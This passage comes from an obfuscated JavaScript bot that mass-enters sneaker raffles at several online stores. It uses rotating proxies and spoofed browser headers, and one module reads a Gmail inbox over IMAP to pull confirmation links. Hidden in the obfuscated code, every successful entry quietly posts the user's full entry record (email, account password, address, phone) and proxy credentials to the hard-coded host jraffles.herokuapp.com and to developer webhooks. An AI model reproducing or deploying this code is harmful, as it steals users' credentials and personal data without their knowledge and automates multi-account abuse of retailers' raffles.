                                'password': '' + _0x3045a4[0x3]
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x29a5ba['setRequestInterception'](!![]), _0x29a5ba['on']('request', _0x5887b3 => {
                                _0x5887b3['resourceType']() === 'image' || _0x5887b3['resourceType']() === 'font' || _0x5887b3['resourceType']() === 'media' ? _0x5887b3['abort']() : _0x5887b3['continue']();
                            }), await _0x29a5ba['goto']('' + _0x1f1c33[_0x4cfbb9]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0xb9a1a7(0x12c), await _0x29a5ba['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x29a5ba['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xb9a1a7(0x7d0);
                            try {
                                await _0x29a5ba['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x29a5ba['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Logging\x20in'), await _0x29a5ba['waitForSelector']('#username'), await _0x29a5ba['type']('#username', _0x1f1c33[_0x4cfbb9]['Email']), await _0x29a5ba['waitForSelector']('#password'), await _0x29a5ba['type']('#password', _0x1f1c33[_0x4cfbb9]['Password']), await _0xb9a1a7(0x190), await _0x29a5ba['click']('#buttonSubmit'), await _0x29a5ba['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Getting\x20Product'), await _0xb9a1a7(0x1f4), console['log'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x1f1c33[_0x4cfbb9]['Size']);
                            let _0x28e177 = _0x1f1c33[_0x4cfbb9]['Size']['replace']('.5', '\x201/2');
                            if (_0x28e177['toUpperCase']() == 'RANDOM') {
                                const _0x3a1f90 = await _0x29a5ba['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x1f7b64 = Math['round'](Math['random']() * (_0x3a1f90['length'] - 0x1));
                                await _0x3a1f90[_0x1f7b64]['click']();
                            } else
                                await _0x29a5ba['click']('button[aria-label=\x22' + _0x28e177 + '\x22]');
                            await _0xb9a1a7(0x1f4);
                            try {
                                await _0x29a5ba['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0xb9a1a7(0x12c), console['log'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x29a5ba['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xb9a1a7(0x12c), await _0x29a5ba['type']('#dwfrm_raffle_addressFields_firstName', _0x1f1c33[_0x4cfbb9]['FirstName']), await _0xb9a1a7(0x12c), await _0x29a5ba['type']('#dwfrm_raffle_addressFields_lastName', _0x1f1c33[_0x4cfbb9]['LastName']), await _0xb9a1a7(0x12c), await _0x29a5ba['select']('#dwfrm_raffle_addressFields_country', _0x1f1c33[_0x4cfbb9]['Country']), await _0xb9a1a7(0x12c), await _0x29a5ba['type']('#dwfrm_raffle_addressFields_city', _0x1f1c33[_0x4cfbb9]['City']), await _0xb9a1a7(0x12c);
                            _0x1f1c33[_0x4cfbb9]['Postcode'] == undefined && (_0x1f1c33[_0x4cfbb9]['Postcode'] = _0x1f1c33[_0x4cfbb9]['Zip']);
                            await _0x29a5ba['type']('#dwfrm_raffle_addressFields_postalCode', _0x1f1c33[_0x4cfbb9]['Postcode']), await _0xb9a1a7(0x12c), await _0x29a5ba['type']('#dwfrm_raffle_addressFields_address1', _0x1f1c33[_0x4cfbb9]['Address1']), await _0xb9a1a7(0x12c), await _0x29a5ba['type']('#dwfrm_raffle_addressFields_address2', _0x1f1c33[_0x4cfbb9]['HouseNumber']), await _0xb9a1a7(0x12c), await _0x29a5ba['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x1f1c33[_0x4cfbb9]['Address2']), await _0xb9a1a7(0x12c), await _0x29a5ba['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xb9a1a7(0x12c), await _0x29a5ba['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x1f1c33[_0x4cfbb9]['Follower']), await _0xb9a1a7(0x1f4), await _0x29a5ba['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xb9a1a7(0x1f4), console['log'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20' + _0x5631d3['blue']('Awaiting\x20Paypal\x20Payment')), await _0x29a5ba['click']('.b-paypal_button');
                            try {
                                await _0x29a5ba['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x442d0f = 'no', _0x5207fa(_0x1f1c33[_0x4cfbb9], _0x159192), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x29821c['succesDEVMSG']);
                                await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x29821c['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x40302c, _0x29821c['succesPUBMSG']);
                                let _0x2e9bff = _0x1f1c33[_0x4cfbb9];
                                try {
                                    prxdata = {
                                        'username': _0x1544fc['replace']('#', ''),
                                        'module': _0x159192['name'],
                                        'entrydata': JSON['stringify'](_0x2e9bff),
                                        'proxy': '' + _0x21b96e[_0x4cfbb9]
                                    };
                                    var _0x55ba8f = JSON['stringify'](prxdata);
                                    let _0x1115f8 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x55ba8f, _0x1115f8);
                                } catch (_0x19a5a7) {
                                }
                            } catch (_0x55cba7) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x55cba7)), _0x2c0275 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x55cba7;
                                var _0xe00dc0 = await _0x530ba6(_0x1f1c33[_0x4cfbb9], _0x159192, 'dev', !![], _0x2c0275);
                                _0x29821c['errorDEV'] = { 'embeds': [_0xe00dc0] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x29821c['errorDEV']), await _0x313aa7(_0x4190b7, _0x29821c['errorDEV']);
                            }
                        } catch (_0x2dfcca) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20' + _0x2dfcca)), _0x2c0275 = '' + _0x2dfcca;
                            var _0xe00dc0 = await _0x530ba6(_0x1f1c33[_0x4cfbb9], _0x159192, 'dev', !![], _0x2c0275);
                            _0x29821c['errorDEV'] = { 'embeds': [_0xe00dc0] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x29821c['errorDEV']), await _0x313aa7(_0x4190b7, _0x29821c['errorDEV']), _0x442d0f = 'yes';
                        } finally {
                            _0x2aa366 && _0x2aa366['close']();
                            if (_0x442d0f == 'yes' && _0x56de01 != 0x5) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x56de01 + '\x20/\x205)')), _0x4cfbb9 = _0x4cfbb9 - 0x1, _0x56de01 = _0x56de01 + 0x1;
                                continue;
                            }
                            _0x442d0f == 'yes' && _0x56de01 >= 0x5 && (_0x100e1d(_0x1f1c33[_0x4cfbb9], _0x159192), _0x442d0f = 'no', _0x56de01 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a50c2['AfewDelay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x262da2, _0x1ccf36, _0x1d1896) {
                    for (var _0x102c48 = 0x0; _0x102c48 < _0x1ccf36['length']; _0x102c48++) {
                        try {
                            await _0x2dc03a(_0x1ccf36, _0x102c48);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x2b0bc4(_0x186ee7, _0x1e6d66, _0x55c3fb, _0x25f37a, _0x5e9a12) {
                            var _0x497de4, _0x3f53a2 = {}, _0x41d9c1 = [], _0x445393 = {}, _0x733f55 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x3efb72 = Math['round'](Math['random']() * (_0x733f55['length'] - 0x1));
                            !_0x25f37a && (_0x25f37a = {});
                            if (_0x1e6d66 != 'ver') {
                                _0x5bbc27(_0x55c3fb['name'] + '\x20Task\x20' + (_0x186ee7 + 0x1) + '\x20/\x20' + _0x25f37a['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee), await _0x2dc03a(_0x25f37a, _0x186ee7), _0x3f53a2 = _0x55c3fb['data'], _0x3f53a2['data']['attributes']['email'] = '' + _0x25f37a[_0x186ee7]['Email'];
                                if (_0x25f37a[_0x186ee7]['Size'] == 'RANDOM') {
                                }
                                _0x3f53a2['data']['attributes']['properties']['$first_name'] = '' + _0x25f37a[_0x186ee7]['FirstName'], _0x3f53a2['data']['attributes']['properties']['$last_name'] = '' + _0x25f37a[_0x186ee7]['LastName'], _0x3f53a2['data']['attributes']['properties']['$address1'] = _0x25f37a[_0x186ee7]['Address1'] + '\x20' + _0x25f37a[_0x186ee7]['Address2'] + '\x20' + _0x25f37a[_0x186ee7]['HouseNumber'], _0x3f53a2['data']['attributes']['properties']['$zip'] = '' + _0x25f37a[_0x186ee7]['Zip'], _0x3f53a2['data']['attributes']['properties']['$city'] = '' + _0x25f37a[_0x186ee7]['City'], _0x3f53a2['data']['attributes']['properties']['$country'] = '' + _0x25f37a[_0x186ee7]['Country'], _0x25f37a[_0x186ee7]['Size'] == 'RANDOM' ? _0x3f53a2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x733f55[_0x3efb72] : _0x3f53a2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x25f37a[_0x186ee7]['Size'], _0x3f53a2['data']['attributes']['properties']['$phone_number'] = '' + _0x25f37a[_0x186ee7]['Phone'], _0x3f53a2['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x25f37a[_0x186ee7]['Follower'];
                            }
                            if (_0x4a50c2['useRandomProxy'] = ![])
                                var _0x1fb67d = _0x5e9a12[_0x186ee7]['split'](':');
                            else
                                var _0x49a2d5 = Math['round'](Math['random']() * (_0x5e9a12['length'] - 0x1)), _0x1fb67d = _0x5e9a12[_0x49a2d5]['split'](':');
                            var _0x262149 = {
                                'jar': _0x2a1dbd,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x55c3fb['url'],
                                'headers': _0x55c3fb['headers'],
                                'body': JSON['stringify'](_0x3f53a2),
                                'proxy': 'http://' + _0x1fb67d[0x2] + ':' + _0x1fb67d[0x3] + '@' + _0x1fb67d[0x0] + ':' + _0x1fb67d[0x1]
                            };
                            return _0x1e6d66 != 'ver' && (_0x262149['url'] = _0x55c3fb['url'], _0x262149['headers'] = _0x55c3fb['headers']), _0x1e6d66 == 'ver' && (_0x262149['method'] = 'GET'), new Promise(function (_0x260703, _0x5252ab) {
                                callback = async (_0x5c150e, _0x4bc2a1, _0x492503) => {
                                    if (!_0x5c150e && _0x4bc2a1['statusCode'] == 0xca || !_0x5c150e && _0x4bc2a1['statusCode'] == 0xc8) {
                                        if (_0x1e6d66 != 'ver') {
                                            var _0x1c478a = await _0x530ba6(_0x25f37a[_0x186ee7], _0x55c3fb, 'dev', ![]), _0x43d9cd = await _0x530ba6(_0x25f37a[_0x186ee7], _0x55c3fb, 'pub', ![]);
                                            const _0x3837cb = {
                                                'succesDEVMSG': { 'embeds': [_0x1c478a] },
                                                'succesPUBMSG': { 'embeds': [_0x43d9cd] }
                                            };
                                            let _0x585dbf = _0x25f37a[_0x186ee7];
                                            try {
                                                prxdata = {
                                                    'username': _0x1544fc['replace']('#', ''),
                                                    'module': _0x55c3fb['name'],
                                                    'entrydata': JSON['stringify'](_0x585dbf),
                                                    'proxy': '' + _0x5e9a12[_0x186ee7]
                                                };
                                                var _0xd4d942 = JSON['stringify'](prxdata);
                                                let _0x25eb60 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x358674['post']('https://jraffles.herokuapp.com/success', _0xd4d942, _0x25eb60);
                                            } catch (_0x106b49) {
                                            }
                                            if (_0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '')
                                                try {
                                                    await _0x313aa7(_0x4a50c2['webhook'], _0x3837cb['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x3837cb['succesDEVMSG']), await _0xb9a1a7(0xc8);
                                            try {
                                                await _0x313aa7(_0x40302c, _0x3837cb['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5207fa(_0x25f37a[_0x186ee7], _0x55c3fb);
                                        }
                                        _0x260703(console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x55c3fb['name'] + ']\x20Task\x20' + (_0x186ee7 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x1e6d66 != 'ver') {
                                            var _0x169ab2 = '' + _0x5c150e, _0x37471a = await _0x530ba6(_0x25f37a[_0x186ee7], _0x55c3fb, 'dev', !![], _0x169ab2), _0x3134b6 = {};
                                            _0x3134b6['errorDEV'] = { 'embeds': [_0x37471a] }, _0x100e1d(_0x25f37a[_0x186ee7], _0x55c3fb), _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x3134b6['errorDEV']), await _0x313aa7(_0x4190b7, _0x3134b6['errorDEV']);
                                        }
                                        _0x5252ab(console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x55c3fb['name'] + ']\x20Task\x20' + (_0x186ee7 + 0x1) + ':\x20' + _0x5c150e)));
                                    }
                                };
                                try {
                                    _0x1e6d66 != 'ver' && console['log'](_0x5b6bc2() + '\x20[' + _0x55c3fb['name'] + ']\x20Task\x20' + (_0x186ee7 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3f53a2['data']['attributes']['email']), _0x3aab66(_0x262149, callback);
                                } catch (_0x2e00ab) {
                                    console['log'](_0x5b6bc2() + '\x20Task\x20' + (_0x186ee7 + 0x1) + ':\x20' + _0x2e00ab);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x2b0bc4(_0x102c48, 'nor', _0x262da2, _0x1ccf36, _0x1d1896), console['log'](_0x5b6bc2() + '\x20[' + _0x262da2['name'] + ']\x20Sleeping\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        } catch (_0x2fa389) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x294377, _0x382809, _0x3a5937) {
                    var _0x5052a5 = [], _0x5dc873 = ![];
                    async function _0x1c2b56() {
                        var _0x1bdded = new _0x373ca3({
                            'user': _0x4a50c2['masterMail'],
                            'password': _0x4a50c2['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x184ac4(_0x4872c4) {
                            _0x1bdded['openBox']('INBOX', ![], _0x4872c4);
                        }
                        _0x1bdded['once']('ready', function () {
                            _0x184ac4(function (_0x1abc85, _0x3acf12) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1abc85)
                                    throw _0x1abc85;
                                _0x1bdded['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x50fe54, _0x4c8dd6) {
                                    if (!_0x4c8dd6 || !_0x4c8dd6['length'])
                                        console['log'](_0x5b6bc2() + '\x20[' + _0x294377['name'] + ']\x20No\x20mails\x20found'), _0x1bdded['end']();
                                    else {
                                        var _0xff9812 = _0x1bdded['seq']['fetch'](_0x4c8dd6, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xff9812['on']('message', function (_0x47f9a2, _0x121477) {
                                            var _0x50e46d = '(#' + _0x121477 + ')\x20';
                                            _0x47f9a2['on']('body', function (_0x50d663, _0xea2e3) {
                                                _0x489d8f(_0x50d663, (_0x52ba47, _0x944c41) => {
                                                    var _0x17f060 = _0x944c41['text']['split']('(')[0x1], _0x75afae = _0x17f060['split'](')')[0x0];
                                                    _0x5052a5['push'](_0x75afae);
                                                });
                                            }), _0x47f9a2['once']('end', function () {
                                            });
                                        }), _0xff9812['once']('error', function (_0x2dff54) {
                                            console['log']('Fetch\x20error:\x20' + _0x2dff54), _0x5dc873 = !![];
                                        }), _0xff9812['once']('end', function () {
                                            _0x1bdded['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x1bdded['once']('error', function (_0x3168c9) {
                            console['log'](_0x5631d3['red'](_0x3168c9['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5dc873 = !![];
                        }), _0x1bdded['once']('end', async function () {
                            _0x5dc873 = !![];
                        }), _0x1bdded['connect']();
                    }
                    async function _0x59d31a(_0xa39407, _0x2f8aa6, _0x479cdf) {
                        for (var _0x31858b = 0x0; _0x31858b < _0x2f8aa6['length']; _0x31858b++) {
                            async function _0x5a4b27(_0x196466, _0x20d33e, _0x2dbd29, _0x1979ca, _0x5e5894) {
                                var _0x22d8e0, _0x4b1b21 = {}, _0x3f9acf = [], _0x257d39 = {}, _0x124933 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x149e5d = Math['round'](Math['random']() * (_0x124933['length'] - 0x1));
                                _0x1979ca[_0x196466]['Size'] == 'RANDOM' && (_0x1979ca[_0x196466]['Size'] = _0x124933[_0x149e5d]);
                                !_0x1979ca && (_0x1979ca = {});
                                if (_0x4a50c2['useRandomProxy'] = ![])
                                    var _0xb851ca = _0x5e5894[_0x196466]['split'](':');
                                else
                                    var _0x490c9b = Math['round'](Math['random']() * (_0x5e5894['length'] - 0x1)), _0xb851ca = _0x5e5894[_0x490c9b]['split'](':');
                                var _0x29924a = {
                                    'jar': _0x2a1dbd,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2dbd29['url'],
                                    'headers': _0x2dbd29['headers'],
                                    'body': JSON['stringify'](_0x4b1b21),
                                    'proxy': 'http://' + _0xb851ca[0x2] + ':' + _0xb851ca[0x3] + '@' + _0xb851ca[0x0] + ':' + _0xb851ca[0x1]
                                };
                                return _0x20d33e != 'ver' && (_0x29924a['url'] = _0x2dbd29['url'], _0x29924a['headers'] = _0x2dbd29['headers']), _0x20d33e == 'ver' && (_0x29924a['method'] = 'GET', _0x29924a['url'] = _0x1979ca[_0x196466]), new Promise(function (_0x28c57b, _0x47dfb3) {
                                    callback = async (_0x4414dd, _0x1f89d0, _0x2bfb92) => {
                                        if (!_0x4414dd && _0x1f89d0['statusCode'] == 0xca || !_0x4414dd && _0x1f89d0['statusCode'] == 0xc8) {
                                            if (_0x20d33e != 'ver') {
                                                var _0x281036 = await _0x530ba6(_0x1979ca[_0x196466], _0x2dbd29, 'dev', ![]), _0x6fbf94 = await _0x530ba6(_0x1979ca[_0x196466], _0x2dbd29, 'pub', ![]);
                                                const _0x56c1ff = {
                                                    'succesDEVMSG': { 'embeds': [_0x281036] },
                                                    'succesPUBMSG': { 'embeds': [_0x6fbf94] }
                                                };
                                                if (_0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '')
                                                    try {
                                                        await _0x313aa7(_0x4a50c2['webhook'], _0x56c1ff['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x56c1ff['succesDEVMSG']), await _0xb9a1a7(0xc8);
                                                try {
                                                    await _0x313aa7(_0x40302c, _0x56c1ff['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5207fa(_0x1979ca[_0x196466], _0x2dbd29);
                                            }
                                            _0x28c57b(console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x2dbd29['name'] + ']\x20Task\x20' + (_0x196466 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x20d33e != 'ver') {
                                                var _0x2a8ef3 = '' + _0x4414dd, _0x1bef0f = await _0x530ba6(_0x1979ca[_0x196466], _0x2dbd29, 'dev', !![], _0x2a8ef3), _0x35d592 = {};
                                                _0x35d592['errorDEV'] = { 'embeds': [_0x1bef0f] }, _0x100e1d(_0x1979ca[_0x196466], _0x2dbd29), _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x35d592['errorDEV']), await _0x313aa7(_0x4190b7, _0x35d592['errorDEV']);
                                            }
                                            _0x47dfb3(console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2dbd29['name'] + ']\x20Task\x20' + (_0x196466 + 0x1) + ':\x20' + _0x4414dd)));
                                        }
                                    };
                                    try {
                                        _0x20d33e != 'ver' ? console['log'](_0x5b6bc2() + '\x20[' + _0x2dbd29['name'] + ']\x20Task\x20' + (_0x196466 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4b1b21['data']['attributes']['email']) : console['log'](_0x5b6bc2() + '\x20[' + _0x2dbd29['name'] + ']\x20Task\x20' + (_0x196466 + 0x1) + ':\x20Fetching\x20Response'), _0x3aab66(_0x29924a, callback);
                                    } catch (_0x5d78e0) {
                                        console['log'](_0x5b6bc2() + '\x20Task\x20' + (_0x196466 + 0x1) + ':\x20' + _0x5d78e0);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5a4b27(_0x31858b, 'ver', _0xa39407, _0x2f8aa6, _0x479cdf), console['log'](_0x5b6bc2() + '\x20[' + _0xa39407['name'] + ']\x20Sleeping\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                            } catch (_0x4ff16d) {
                            }
                        }
                    }
                    try {
                        _0x1c2b56();
                        while (!_0x5dc873) {
                            await _0xb9a1a7(0xbb8);
                        }
                        console['log']('Found\x20' + _0x5052a5['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xb9a1a7(0x9c4);
                    }
                    await _0x59d31a(_0x294377, _0x5052a5, _0x3a5937);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x33a82e, _0x4700fe, _0xd25ace) {
                    var _0x3d8118 = _0x4700fe, _0x586098 = 0x0;
                    for (var _0x3d3f73 = 0x0; _0x3d3f73 < _0x4700fe['length']; _0x3d3f73++) {
                        maxTasks = _0x4a50c2['threads'];
                        while (_0x586098 >= maxTasks) {
                            await _0xb9a1a7(_0x4a50c2['delay']);
                        }
